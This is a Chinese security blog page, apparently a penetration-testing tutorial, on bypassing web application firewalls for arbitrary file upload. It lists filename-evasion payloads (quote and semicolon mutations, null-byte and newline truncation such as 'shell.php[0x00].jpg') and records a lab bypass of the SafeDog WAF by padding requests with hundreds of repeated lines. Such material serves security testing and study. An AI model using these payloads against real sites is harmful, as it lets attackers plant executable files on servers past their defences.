@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fuming">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="任意文件上传绕过数据包解析一个正常的文件上传数据包大致如下： 12345678910111213141516171819202122POST &#x2F;upload&#x2F;upload.php HTTP&#x2F;1.1Host: localhostUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko&#x2F;20100101 Firefox&#x2F;46.0Ac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="任意文件上传绕过">
+<meta property="og:url" content="https://fuyoumingyan.github.io/2023/06/11/WAF%E7%BB%95%E8%BF%87/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="fuyoumingyan&#39;s blog">
+<meta property="og:description" content="任意文件上传绕过数据包解析一个正常的文件上传数据包大致如下： 12345678910111213141516171819202122POST &#x2F;upload&#x2F;upload.php HTTP&#x2F;1.1Host: localhostUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko&#x2F;20100101 Firefox&#x2F;46.0Ac">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115852.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115959.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115969.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115978.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115989.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115996.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115381.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115390.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115396.png">
+<meta property="article:published_time" content="2023-06-11T06:59:51.000Z">
+<meta property="article:modified_time" content="2023-09-05T03:54:49.936Z">
+<meta property="article:author" content="fuming">
+<meta property="article:tag" content="WAF绕过">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115852.png">
+  
+  
+  
+  <title>任意文件上传绕过 - fuyoumingyan&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fuyoumingyan.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fuyoumingyan&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="任意文件上传绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-11 14:59" pubdate>
+          2023年6月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">任意文件上传绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="任意文件上传绕过"><a href="#任意文件上传绕过" class="headerlink" title="任意文件上传绕过"></a>任意文件上传绕过</h1><h2 id="数据包解析"><a href="#数据包解析" class="headerlink" title="数据包解析"></a>数据包解析</h2><p>一个正常的文件上传数据包大致如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/upload/upload.html<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------163532972832098<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>327<br><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;myfile&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">涓婁紶</span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span>--</span><br></code></pre></td></tr></table></figure>
+
+<p><code>Header</code>内容：</p>
+<ul>
+<li><code>Content-Type:multipart/form-data</code>：表示该请求为文件上传请求</li>
+<li><code>boundary=---...98</code>：作用为分隔符，以区分POST数据</li>
+</ul>
+<p><code>POST数据</code>内容：</p>
+<ul>
+<li><code>Content-Disposition</code>：响应标头是指示内容是否预期在浏览器中内联显示的标题</li>
+<li><code>name</code>：包含该字段的内容引用的 HTML 字段的名称</li>
+<li><code>filename</code>：后面是一个包含传输文件的原始名称的字符串。</li>
+<li>分隔符：在<code>boundary</code>前增加<code>--</code>，上传结束结尾增加<code>--</code></li>
+</ul>
+<p>可修改的内容：</p>
+<ul>
+<li><p>Content-Disposition：一般可更改</p>
+</li>
+<li><p>name：表单参数值，不能更改</p>
+</li>
+<li><p>filename：文件名，可以更改</p>
+</li>
+<li><p>Content-Type：文件 MIME，视情况更改</p>
+</li>
+<li><p>boundary：内容划分，可以更改</p>
+</li>
+</ul>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="字符变异"><a href="#字符变异" class="headerlink" title="字符变异"></a>字符变异</h3><ul>
+<li>引号变异  &#x3D;&gt;  单引号&#x2F;双引号&#x2F;单双引号&#x2F;无引号</li>
+<li>参数名大小写变换  &#x3D;&gt;   <code>filename / name </code></li>
+<li>分号重复  &#x3D;&gt;  <code>name=&quot;myfile&quot;;;;;;;;;filename=&quot;text.php&quot; </code></li>
+<li>等号重复  &#x3D;&gt;  <code>filename===&quot;text.php&quot; </code></li>
+</ul>
+<h3 id="顺序变换"><a href="#顺序变换" class="headerlink" title="顺序变换"></a>顺序变换</h3><ul>
+<li>交换 <code>name </code>和 <code>filename </code>的顺序</li>
+<li>交换 <code>Content-Disposition </code>和 <code>Content-Type </code>的顺序</li>
+<li>交换不同 <code>boundary </code>内容的顺序</li>
+</ul>
+<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><h4 id="重复溢出"><a href="#重复溢出" class="headerlink" title="重复溢出"></a>重复溢出</h4><h6 id="数据重复"><a href="#数据重复" class="headerlink" title="数据重复"></a>数据重复</h6><p>POST数据包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/upload/upload.html<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------163532972832098<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>327<br><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;myfile&quot;</span>; filename=<span class="hljs-string">&quot;text.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">涓婁紶</span><br><span class="language-php">-----------------------------<span class="hljs-number">163532972832098</span>--</span><br></code></pre></td></tr></table></figure>
+
+<p>POST中可重复的数据：</p>
+<ul>
+<li><code>boundary </code></li>
+<li>文件上传数据  &#x3D;&gt;  1 ~ 2 个换行符之间</li>
+</ul>
+<h6 id="数据包重复"><a href="#数据包重复" class="headerlink" title="数据包重复"></a>数据包重复</h6><p>在之前的SQL注入绕过中有一个  <code>phpline </code> 绕过，文件上传本质上还是POST数据包，跟POST注入是相同的，那么也就可以使用  <code>phpline </code> 重复数据包导致数据溢出。</p>
+<h4 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" title="垃圾数据溢出"></a>垃圾数据溢出</h4><ul>
+<li><code>name  </code>与  <code>filename </code> 之间插入大量垃圾数据</li>
+<li><code>boundary </code> 字符串中加入垃圾数据</li>
+<li><code>boundray </code> 末尾插入垃圾数据</li>
+<li><code>multipart/form-data </code> 与  <code>boundary  </code>之间插入垃圾数据</li>
+</ul>
+<h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><h5 id="换行截断"><a href="#换行截断" class="headerlink" title="换行截断"></a>换行截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>for<br>m-data; name=&quot;upload_<br>file&quot;; fi<br>le<br>name=&quot;tex<br>t<br>.<br>p<br>h<br>p&quot;<br></code></pre></td></tr></table></figure>
+
+<h5 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg;.php&quot;<br></code></pre></td></tr></table></figure>
+
+<h5 id="引号截断"><a href="#引号截断" class="headerlink" title="引号截断"></a>引号截断</h5><p>php &lt; 5.3 单双引号截断特性。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&#x27;.php&quot;<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;.php&quot;<br></code></pre></td></tr></table></figure>
+
+<h5 id="00-截断"><a href="#00-截断" class="headerlink" title="00 截断"></a>00 截断</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php[0x00].jpg&quot;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Bypass-安全狗实战"><a href="#Bypass-安全狗实战" class="headerlink" title="Bypass 安全狗实战"></a>Bypass 安全狗实战</h2><p>测试环境：Apache2.4.39 + PHP7.3.4 + MySql5.7.26 + 网站安全狗(Apache版)4.0.32517</p>
+<h4 id="1-数据溢出-phpline"><a href="#1-数据溢出-phpline" class="headerlink" title="1.数据溢出~phpline"></a>1.数据溢出~phpline</h4><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115852.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里测试下最后以那个数据包的  <code>filename </code> 作为保存：</p>
+<p>搞两个数据包，第一个  <code>filename </code> 是  <code>text.png </code>，第二个 是 <code>text.jpg </code>。</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115959.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看出来，最后是 <code>text.jpg </code>，那么就不断复制数据包，把最后的 <code>filename </code>改成 <code>text.php </code>即可。</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115969.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是搞了200来行，成功绕过，数据包不能搞太多，太多直接报错，一般200~400行就OK。</p>
+<h4 id="2-数据溢出-boundary重复"><a href="#2-数据溢出-boundary重复" class="headerlink" title="2.数据溢出~boundary重复"></a>2.数据溢出~boundary重复</h4><p> <code>boundary </code>，文件上传数据包中的分隔符。</p>
+<p>这里搞到210行后才绕过。</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115978.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="3-数据溢出-POST数据重复"><a href="#3-数据溢出-POST数据重复" class="headerlink" title="3.数据溢出~POST数据重复"></a>3.数据溢出~POST数据重复</h4><p>看下POST数据：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http">------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.php&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>涓婁紶<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e--<br></code></pre></td></tr></table></figure>
+
+<p>测试文件名，内容数据包重复看能否上传：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http">------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.jpg&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;text.png&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/octet-stream<br><br>&lt;?php phpinfo();?&gt;<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;submit&quot;<br><br>涓婁紶<br>------WebKitFormBoundaryZvfnCEkBjLsBSJ6e--<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115989.png" srcset="/img/loading.gif" lazyload></p>
+<p>OK，能重复，文件命名以第二个为准。</p>
+<p>然后重复呗，但是这次出错了，文件加载出来是 <code>text.png </code>：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115996.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115381.png" srcset="/img/loading.gif" lazyload></p>
+<p>哪里来的 <code>text.png </code>呢？</p>
+<p>前面重复的数据呗，那么试试把前面的 <code>filename </code>去掉，只保留最后的：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115390.png" srcset="/img/loading.gif" lazyload></p>
+<p>这次还是没问题，试试：</p>
+<p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051115396.png" srcset="/img/loading.gif" lazyload></p>
+<p>没问题啦，270行以后就OK </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WAF%E7%BB%95%E8%BF%87/" class="category-chain-item">WAF绕过</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WAF%E7%BB%95%E8%BF%87/">#WAF绕过</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>任意文件上传绕过</div>
+      <div>https://fuyoumingyan.github.io/2023/06/11/WAF绕过/任意文件上传绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>fuming</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/07/11/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite/" title="BurpSuite">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BurpSuite</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/09/Golang/Go%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" title="Go 环境配置">
+                        <span class="hidden-mobile">Go 环境配置</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
